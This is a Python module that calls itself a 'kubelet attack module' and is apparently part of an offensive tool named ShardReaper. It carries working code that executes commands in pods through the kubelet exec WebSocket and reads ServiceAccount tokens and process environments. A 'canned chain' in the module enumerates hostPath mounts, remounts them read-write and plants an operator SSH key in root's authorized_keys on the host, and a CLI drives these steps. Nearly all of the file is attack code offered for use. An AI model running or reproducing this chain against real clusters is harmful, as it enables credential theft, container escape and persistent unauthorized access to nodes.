#!/usr/bin/env python3
"""
k8s.py — kubelet/kubernetes attack module with EMPIRICAL defaults.

Every default here is the empirically-verified kubelet contract, not a
guess (post-Cobblestone lessons 12-14):

* Kubelet anonymous-auth bypass: the 10250 read-only port serves /pods and
  /runningpods/ WITHOUT authentication unless --anonymous-auth=false. A
  ServiceAccount token in the Authorization header converts anonymous reads
  into authenticated ones — and a mounted SA token grants EXEC on that node.
* Exec is a WebSocket upgrade to /exec/{ns}/{pod}/{container} with the
  SPDY-derived channel protocol:
    - Sec-WebSocket-Protocol: v4.channel.k8s.io (v5 fallback)
    - command is REPEATABLE (one query param per argv element)
    - output=1&input=1&error=1 (input=1 opens the stdin channel)
    - every ws message carries a 1-byte channel header:
      0x00 stdin  0x01 stdout  0x02 stderr  0x03 error (JSON streamstatus)
    - closing stdin = sending channel-0 with empty payload
* The canned chain: pod list -> hostPath mount enum -> remount rw -> SSH-key
  persistence. remount prints NOTHING on success — every step is marker-
  wrapped and verify-flagged (payload.py discipline). Namespace proof
  (NSpid/userns) runs BEFORE any pod-side effect is trusted.
* Exec-contract probing order is fixed: the module-level side-effect probe
  runs FIRST (write marker + read it back), entrypoint names come second,
  and once any shell exists we READ THE SOURCE (/proc/self/mountinfo,
  /proc/self/cgroup, SA token, cmdline) instead of black-box guessing.

stdlib-only: the WebSocket client is minimal RFC 6455 (client-masked frames,
ping/pong, close) — no external dependencies.
"""
import base64
import json
import os
import socket
import ssl
import struct
import time
from urllib.parse import urlencode

from . import payload
from .payload import assert_literal, literal, marker_wrap, verify_after

# channel bytes of the SPDY-derived exec protocol
CH_STDIN = 0x00
CH_STDOUT = 0x01
CH_STDERR = 0x02
CH_ERROR = 0x03

# v4 first, v5 fallback — both are channel.k8s.io variants
EXEC_PROTOCOLS = ["v4.channel.k8s.io", "v5.channel.k8s.io"]

KUBELET_PORT = 10250
APISERVER_PORT = 6443
REGISTRY_PORT = 5000
DOCKER_TCP_PORT = 2375

# exec-contract probing order: side-effect probe FIRST, entrypoints SECOND
SIDE_EFFECT_PROBE = ("echo __SR_SIDE_EFFECT__ > /tmp/.sr-side-effect && "
                     "cat /tmp/.sr-side-effect")
ENTRYPOINTS = ["/bin/sh", "/bin/bash", "/bin/ash", "/bin/busybox",
               "/bin/zsh", "/bin/dash"]

# once a shell exists: read the source, stop guessing contracts
SOURCE_READS = [
    ("mountinfo", "cat /proc/self/mountinfo"),
    ("cgroup", "cat /proc/self/cgroup"),
    ("sa-token", "cat /var/run/secrets/kubernetes.io/serviceaccount/token"),
    ("sa-namespace", "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"),
    ("cmdline-1", "tr '\\0' ' ' < /proc/1/cmdline"),
    ("environ-1", "cat /proc/1/environ | tr '\\0' '\\n'"),
]


# ---------------- minimal RFC 6455 codec (pure, unit-tested) ----------------
def encode_frame(payload_bytes, opcode=0x2, mask_key=None):
    """Client frame: FIN + opcode, masked (RFC 6455 5.1/5.3)."""
    payload_bytes = bytes(payload_bytes)
    header = bytes([0x80 | (opcode & 0x0F)])
    n = len(payload_bytes)
    if n < 126:
        header += bytes([0x80 | n])
    elif n < 65536:
        header += bytes([0x80 | 126]) + struct.pack(">H", n)
    else:
        header += bytes([0x80 | 127]) + struct.pack(">Q", n)
    key = bytes(mask_key) if mask_key is not None else os.urandom(4)
    masked = bytes(b ^ key[i % 4] for i, b in enumerate(payload_bytes))
    return header + key + masked


def decode_frame(data, offset=0):
    """Parse ONE frame from a byte buffer. Returns (frame_dict, consumed).
    frame_dict: {fin, opcode, payload}. Raises ValueError on truncation."""
    start = offset
    if len(data) < offset + 2:
        raise ValueError("truncated frame header")
    b0, b1 = data[offset], data[offset + 1]
    offset += 2
    fin = (b0 >> 7) & 1
    opcode = b0 & 0x0F
    masked = (b1 >> 7) & 1
    length = b1 & 0x7F
    if length == 126:
        if len(data) < offset + 2:
            raise ValueError("truncated 16-bit length")
        length = struct.unpack(">H", data[offset:offset + 2])[0]
        offset += 2
    elif length == 127:
        if len(data) < offset + 8:
            raise ValueError("truncated 64-bit length")
        length = struct.unpack(">Q", data[offset:offset + 8])[0]
        offset += 8
    mask_key = None
    if masked:
        if len(data) < offset + 4:
            raise ValueError("truncated mask key")
        mask_key = data[offset:offset + 4]
        offset += 4
    if len(data) < offset + length:
        raise ValueError("truncated payload")
    payload = data[offset:offset + length]
    if mask_key:
        payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
    return {"fin": fin, "opcode": opcode, "payload": payload}, \
        (offset + length) - start


def read_frame(sock, timeout=30.0):
    """Read one complete frame from a socket (server frames are unmasked)."""
    sock.settimeout(timeout)
    hdr = _recv_exact(sock, 2)
    if hdr is None:
        return None
    b0, b1 = hdr[0], hdr[1]
    length = b1 & 0x7F
    if length == 126:
        length = struct.unpack(">H", _recv_exact(sock, 2))[0]
    elif length == 127:
        length = struct.unpack(">Q", _recv_exact(sock, 8))[0]
    if b1 & 0x80:  # server frames must not be masked; tolerate anyway
        mask = _recv_exact(sock, 4)
    else:
        mask = None
    payload = _recv_exact(sock, length) or b""
    if mask:
        payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    return {"fin": (b0 >> 7) & 1, "opcode": b0 & 0x0F, "payload": payload}


def _recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


# ---------------- kubelet HTTP ----------------
def _tls_ctx():
    return ssl._create_unverified_context()  # kubelet certs are self-signed


def build_exec_url(namespace, pod, container, command, input_=True,
                   output=True, error=True):
    """The empirical kubelet exec query: command REPEATABLE, output=1,
    input=1 (opens stdin channel), error=1. Returns the path component."""
    if isinstance(command, str):
        command = [command]
    params = [(c, "") for c in command]
    return "/exec/%s/%s/%s?%s" % (
        namespace, pod, container,
        urlencode([("command", c) for c in command]
                  + [("output", "1" if output else "0"),
                     ("input", "1" if input_ else "0"),
                     ("error", "1" if error else "0")]))


def _https_request(host, port, path, method="GET", headers=None, timeout=8,
                   body=None, unix_socket=None):
    """One-shot HTTPS/HTTP request. unix_socket targets /var/run/docker.sock."""
    ctx = _tls_ctx()
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        if unix_socket is None and port not in (80, 2375):
            s = ctx.wrap_socket(s, server_hostname=host)
        req = [f"{method} {path} HTTP/1.1", f"Host: {host}",
               "Connection: close", "User-Agent: ShardReaper/1.2"]
        for k, v in (headers or {}).items():
            req.append(f"{k}: {v}")
        if body:
            req.append(f"Content-Length: {len(body)}")
        req.append("")
        req.append("")
        s.sendall("\r\n".join(req).encode("utf-8"))
        resp = b""
        while b"\r\n\r\n" not in resp:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        head, _, rest = resp.partition(b"\r\n\r\n")
        head_lines = head.decode("utf-8", "ignore").split("\r\n")
        status = int(head_lines[0].split()[1]) if head_lines and \
            len(head_lines[0].split()) > 1 else 0
        return {"status": status, "headers": head_lines[1:],
                "body": rest.decode("utf-8", "ignore")[:4000]}
    finally:
        s.close()


def kubelet_pods(host, port=KUBELET_PORT, token=None, timeout=8, log=None):
    """GET /pods on the kubelet. Anonymous is the canonical unauthenticated
    read; a Bearer SA token converts it to authenticated (and exec-capable).
    Returns {status, body, authenticated}. Never raises."""
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    try:
        r = _https_request(host, port, "/pods", headers=headers, timeout=timeout)
    except OSError as e:
        return {"status": None, "error": str(e), "authenticated": bool(token)}
    r["authenticated"] = bool(token)
    return r


def docker_socket_version(unix_path="/var/run/docker.sock", timeout=5):
    """GET /version over the docker unix socket (no TLS, no creds)."""
    if not os.path.exists(unix_path):
        return {"status": None, "error": "no socket"}
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect(unix_path)
        s.sendall(b"GET /version HTTP/1.1\r\nHost: docker\r\n"
                  b"Connection: close\r\n\r\n")
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
        head, _, rest = buf.partition(b"\r\n\r\n")
        status = int(head.split(b" ", 2)[1]) if len(head.split(b" ", 2)) > 1 else 0
        return {"status": status, "body": rest.decode("utf-8", "ignore")[:2000]}
    except OSError as e:
        return {"status": None, "error": str(e)}
    finally:
        s.close()


# ---------------- WebSocket exec ----------------
def _handshake(host, port, path, token=None, protocol=None, timeout=12):
    key = base64.b64encode(os.urandom(16)).decode()
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s = _tls_ctx().wrap_socket(s, server_hostname=host)
        req = [f"GET {path} HTTP/1.1", f"Host: {host}",
               "Upgrade: websocket", "Connection: Upgrade",
               f"Sec-WebSocket-Key: {key}", "Sec-WebSocket-Version: 13"]
        if protocol:
            req.append(f"Sec-WebSocket-Protocol: {protocol}")
        if token:
            req.append(f"Authorization: Bearer {token}")
        s.sendall(("\r\n".join(req) + "\r\n\r\n").encode())
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
        head, _, rest = buf.partition(b"\r\n\r\n")
        lines = head.decode("utf-8", "ignore").split("\r\n")
        status = int(lines[0].split()[1]) if lines and len(lines[0].split()) > 1 else 0
        if status != 101:
            s.close()
            return {"status": status, "body": rest.decode("utf-8", "ignore")[:2000]}
        subprotocol = None
        for ln in lines[1:]:
            if ln.lower().startswith("sec-websocket-protocol:"):
                subprotocol = ln.split(":", 1)[1].strip()
        return {"sock": s, "status": 101, "subprotocol": subprotocol}
    except OSError as e:
        try:
            s.close()
        except OSError:
            pass
        return {"status": None, "error": str(e)}


def ws_exec(host, port, token, namespace, pod, container, command,
            stdin=None, timeout=30, log=None):
    """Full kubelet exec over WebSocket. Empirical defaults: v4.channel.k8s.io
    with v5 fallback, repeatable command params, output=1&input=1, channel
    framing 0x00/0x01/0x02/0x03. Returns the session transcript — never
    raises."""
    if isinstance(command, str):
        command = [command]
    assert_literal(" ".join(command))
    path = build_exec_url(namespace, pod, container, command)
    attempt = None
    for proto in EXEC_PROTOCOLS:
        attempt = _handshake(host, port, path, token=token, protocol=proto)
        if attempt.get("status") == 101:
            break
    if attempt.get("status") != 101:
        return {"ok": False, "error": "handshake failed",
                "status": attempt.get("status"),
                "body": (attempt.get("body") or "")[:400],
                "error_detail": attempt.get("error")}
    sock = attempt["sock"]
    out = {"stdout": b"", "stderr": b"", "error_stream": None,
           "subprotocol": attempt.get("subprotocol")}
    try:
        if stdin:
            sock.sendall(encode_frame(bytes([CH_STDIN]) + stdin))
        sock.sendall(encode_frame(bytes([CH_STDIN])))  # close stdin channel
        sock.settimeout(timeout)
        deadline = time.time() + timeout
        while time.time() < deadline:
            frame = read_frame(sock, timeout=max(1.0, deadline - time.time()))
            if frame is None:
                break
            if frame["opcode"] == 0x8:      # close
                break
            if frame["opcode"] == 0x9:      # ping -> pong
                sock.sendall(encode_frame(frame["payload"], opcode=0xA))
                continue
            if frame["opcode"] not in (0x1, 0x2):
                continue
            pl = frame["payload"]
            if not pl:
                continue
            ch = pl[0]
            body = pl[1:]
            if ch == CH_STDOUT:
                out["stdout"] += body
            elif ch == CH_STDERR:
                out["stderr"] += body
            elif ch == CH_ERROR:
                try:
                    out["error_stream"] = json.loads(body.decode("utf-8", "ignore"))
                except ValueError:
                    out["error_stream"] = body.decode("utf-8", "ignore")
        out["ok"] = True
        out["stdout_text"] = out["stdout"].decode("utf-8", "ignore")
        out["stderr_text"] = out["stderr"].decode("utf-8", "ignore")
        if isinstance(out["error_stream"], dict):
            out["ok"] = out["error_stream"].get("status") != "Failure"
    except OSError as e:
        out["ok"] = False
        out["error"] = str(e)
    finally:
        try:
            sock.close()
        except OSError:
            pass
    return out


# ---------------- exec-contract probing (FIXED order) ----------------
class _ExecTransport:
    """One kubelet exec transport: a command -> one exec session (kubelet
    binds the command at upgrade time, so each exec is its own handshake)."""
    def __init__(self, host, port, token, namespace, pod, container,
                 timeout=30):
        self.host, self.port, self.token = host, port, token
        self.namespace, self.pod, self.container = namespace, pod, container
        self.timeout = timeout

    def __call__(self, cmd, stdin=None):
        r = ws_exec(self.host, self.port, self.token, self.namespace,
                    self.pod, self.container, [cmd], stdin=stdin,
                    timeout=self.timeout)
        return r.get("stdout_text", ""), r.get("stderr_text", ""), r


def exec_one_for(host, port, token, namespace, pod, container, timeout=30):
    """Callable exec transport bound to one pod/container."""
    return _ExecTransport(host, port, token, namespace, pod, container,
                          timeout=timeout)


def probe_exec_contract(host, port, token, namespace, pod, container,
                        timeout=30, log=None):
    """Fixed order (lesson 13): 1) module-level side-effect probe FIRST,
    2) entrypoint names, 3) source reads once a shell exists."""
    exec_one = exec_one_for(host, port, token, namespace, pod, container,
                            timeout=timeout)
    report = {"host": host, "pod": pod, "entrypoints": {}, "source": {}}
    # 1 — side-effect probe: the exec contract is only proven when a marker
    # we wrote comes back through the read path.
    so, se, raw = exec_one(SIDE_EFFECT_PROBE)
    report["side_effect"] = {
        "ok": "__SR_SIDE_EFFECT__" in (so or ""),
        "stdout": (so or "")[:200], "stderr": (se or "")[:200],
        "raw_ok": bool(raw.get("ok")), "subprotocol": raw.get("subprotocol"),
        "status": raw.get("status"), "body": (raw.get("body") or "")[:200]}
    if not report["side_effect"]["ok"]:
        return report
    # 2 — entrypoint names, only after the contract itself is proven
    for ep in ENTRYPOINTS:
        so, se, raw = exec_one(f"{ep} -c 'echo __SR_ENTRY__'")
        report["entrypoints"][ep] = {"ok": "__SR_ENTRY__" in (so or ""),
                                     "err": (se or "")[:120]}
    # 3 — a shell exists: READ THE SOURCE, stop guessing contracts
    for name, cmd in SOURCE_READS:
        so, se, _ = exec_one(cmd)
        report["source"][name] = (so or "")[:600]
    report["shell"] = next((ep for ep, v in report["entrypoints"].items()
                            if v["ok"]), None)
    return report


# ---------------- canned chain: pods -> mounts -> remount -> SSH key --------
def pod_mounts(pods_body):
    """hostPath enum from a /pods response. Returns [{pod, namespace,
    container, mount_path, host_path, read_only}] — the empirical pivot
    to host filesystem."""
    out = []
    for pod in pods_body.get("items", []):
        ns = pod.get("metadata", {}).get("namespace", "default")
        name = pod.get("metadata", {}).get("name", "?")
        spec = pod.get("spec", {}) or {}
        for vol in spec.get("volumes", []):
            hp = vol.get("hostPath")
            if not hp:
                continue
            host_path = hp.get("path")
            read_only = bool(hp.get("type") not in (None, "DirectoryOrCreate",
                                                    "Directory")) or not hp
            for c in spec.get("containers", []):
                for vm in c.get("volumeMounts", []):
                    if vm.get("name") == vol.get("name"):
                        out.append({"pod": name, "namespace": ns,
                                    "container": c.get("name", ""),
                                    "mount_path": vm.get("mountPath"),
                                    "host_path": host_path,
                                    "read_only": read_only or bool(vm.get("readOnly"))})
    return out


def ssh_key_persist(exec_one, mount_path, pubkey, ssh_user="root",
                    log=None):
    """Append an operator key to <mount_path>/<user>/.ssh/authorized_keys on
    the HOST via the pod mount. Marker-wrapped and verify-flagged: the write
    is only claimed after grep returns the key fingerprint."""
    log = log or (lambda m: None)
    key_line = pubkey.strip()
    fingerprint = key_line.split()[-1][:24] if key_line.split() else "SRKEY"
    ssh_dir = f"{mount_path.rstrip('/')}/{ssh_user}/.ssh"
    mkdir_cmd = literal("mkdir", "-p", ssh_dir)
    write_cmd = literal("echo", key_line, ">>", f"{ssh_dir}/authorized_keys")
    verify_cmd = literal("grep", "-F", fingerprint,
                         f"{ssh_dir}/authorized_keys")
    log(f"persist: {ssh_dir}/authorized_keys")
    so, se, raw = exec_one(marker_wrap(f"{mkdir_cmd} && {write_cmd}",
                                       label="keywrite"))
    so2, se2, raw2 = exec_one(marker_wrap(verify_cmd, label="keyverify"))
    ok = fingerprint in (so2 or "")
    return {"ssh_dir": ssh_dir, "ok": ok,
            "write_stdout": (so or "")[:200], "write_stderr": (se or "")[:200],
            "verify_stdout": (so2 or "")[:200],
            "raw_ok": bool(raw.get("ok")) and bool(raw2.get("ok"))}


def canned_chain(host, port, token, pubkey=None, pod=None, container=None,
                 namespace="default", timeout=30, log=None):
    """THE canonical kubelet chain, with discipline baked in:
    1. pod list (REST, authenticated with the SA token)
    2. namespace proof (NSpid/userns) before trusting anything
    3. hostPath mount enum
    4. mount -o remount,rw (silent!) — verify via /proc/mounts flag
    5. SSH authorized_keys persistence — verify via grep fingerprint"""
    log = log or (lambda m: None)
    chain = {"host": host, "steps": []}
    pods = kubelet_pods(host, port, token=token, timeout=timeout, log=log)
    chain["pods_status"] = pods.get("status")
    chain["authenticated"] = bool(token)
    if pods.get("status") != 200:
        chain["ok"] = False
        chain["error"] = pods.get("body", pods.get("error", "pods failed"))[:300]
        return chain
    try:
        pods_body = json.loads(pods.get("body") or "{}")
    except ValueError:
        chain["ok"] = False
        chain["error"] = "pods body is not JSON"
        return chain
    mounts = pod_mounts(pods_body)
    chain["mounts"] = mounts
    if not mounts:
        chain["ok"] = False
        chain["error"] = "no hostPath mounts enumerated"
        return chain
    target = next((m for m in mounts if (pod and m["pod"] == pod) or not pod),
                  mounts[0])
    chain["target"] = target
    exec_one = exec_one_for(host, port, token, target["namespace"],
                            target["pod"], target["container"] or "",
                            timeout=timeout)
    # 2 — prove the namespace BEFORE trusting side effects
    so, _, _ = exec_one("cat /proc/self/status")
    nspid = payload.parse_nspid(so or "")
    so, _, _ = exec_one("readlink /proc/self/ns/user")
    userns = (so or "").strip()
    chain["ns"] = {"nspid": nspid, "userns_inode": userns,
                   "host_userns": userns == payload.HOST_USERNS_INODE}
    # 3-5 — remount rw (silent) then verified persistence
    vp = verify_after(f"mount -o remount,rw {target['mount_path']}",
                      f"grep -F ' {target['mount_path']} ' /proc/mounts",
                      expect="rw")
    so, se, raw = exec_one(marker_wrap(vp["cmd"], label="remount"))
    so2, se2, raw2 = exec_one(marker_wrap(vp["verify"], label="remountverify"))
    remounted = vp["expect"] in (so2 or "")
    chain["steps"].append({"step": "remount-rw", "ok": remounted,
                           "verify": (so2 or "")[:200],
                           "stderr": (se or "")[:200]})
    if remounted and pubkey:
        persist = ssh_key_persist(exec_one, target["mount_path"], pubkey,
                                  log=log)
        chain["steps"].append({"step": "ssh-key-persist", "ok": persist["ok"],
                               **{k: v for k, v in persist.items()
                                  if k not in ("ok", "raw_ok")}})
    chain["ok"] = remounted and (not pubkey or chain["steps"][-1].get("ok"))
    return chain


# ---------------- CLI ----------------
def cli_kube_exec(args):
    cmd = args.command
    r = ws_exec(args.host, args.port, args.token, args.namespace, args.pod,
                args.container or "", cmd, stdin=args.stdin, timeout=args.timeout)
    print(json.dumps({k: v for k, v in r.items()
                      if k in ("ok", "status", "subprotocol", "stdout_text",
                               "stderr_text", "error_stream", "error", "body")},
                     indent=1, default=str))
    return 0 if r.get("ok") else 1


def cli_kube_chain(args):
    pubkey = None
    if args.pubkey and os.path.isfile(args.pubkey):
        pubkey = open(args.pubkey, encoding="utf-8").read().strip()
    elif args.pubkey:
        pubkey = args.pubkey
    chain = canned_chain(args.host, args.port, args.token, pubkey=pubkey,
                         pod=args.pod, container=args.container,
                         namespace=args.namespace, timeout=args.timeout,
                         log=lambda m: print(f"[k8s] {m}"))
    print(json.dumps(chain, indent=1, default=str))
    return 0 if chain.get("ok") else 1


def cli_kube_probe(args):
    r = probe_exec_contract(args.host, args.port, args.token, args.namespace,
                            args.pod, args.container or "",
                            timeout=args.timeout,
                            log=lambda m: print(f"[k8s] {m}"))
    print(json.dumps(r, indent=1, default=str))
    return 0 if r.get("side_effect", {}).get("ok") else 1


def build_arg_parser(sub):
    k = sub.add_parser("kube", help="kubelet attack module (exec/chain/probe)")
    ks = k.add_subparsers(dest="kube_cmd")
    for name, help_, fn, extra in (
            ("exec", "kubelet WebSocket exec (v4.channel.k8s.io, v5 fallback)",
             cli_kube_exec, "exec"),
            ("chain", "canned chain: pods -> mounts -> remount rw -> ssh key",
             cli_kube_chain, "chain"),
            ("probe", "exec-contract probe: side-effect first, then entrypoints, then source",
             cli_kube_probe, "probe")):
        p = ks.add_parser(name, help=help_)
        p.add_argument("--host", required=True)
        p.add_argument("--port", type=int, default=KUBELET_PORT)
        p.add_argument("--token", default=None, help="SA token (Bearer)")
        p.add_argument("--namespace", default="default")
        p.add_argument("--pod", required=True)
        p.add_argument("--container", default="")
        p.add_argument("--timeout", type=float, default=30)
        if extra == "exec":
            p.add_argument("command", nargs="+")
            p.add_argument("--stdin", default=None)
        if extra == "chain":
            p.add_argument("--pubkey", default=None,
                           help="path to SSH public key (or inline)")
        p.set_defaults(fn=lambda a, _f=fn: _f(a))
    return k
